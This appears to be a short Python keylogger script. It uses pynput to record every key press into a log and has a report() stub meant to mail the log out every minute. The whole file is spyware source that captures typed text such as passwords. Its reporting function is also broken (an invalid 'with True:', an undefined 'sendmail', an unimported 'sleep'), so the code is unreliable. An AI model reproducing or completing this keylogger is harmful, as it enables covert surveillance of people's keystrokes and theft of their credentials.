import pynput.keyboard

log = ""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        log = log + " " + str(key) + " "
    print(log)

def report():
    with True:
        sendmail
        sleep(60)

keyborad_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyborad_listener:
    keyborad_listener.join()
    report()

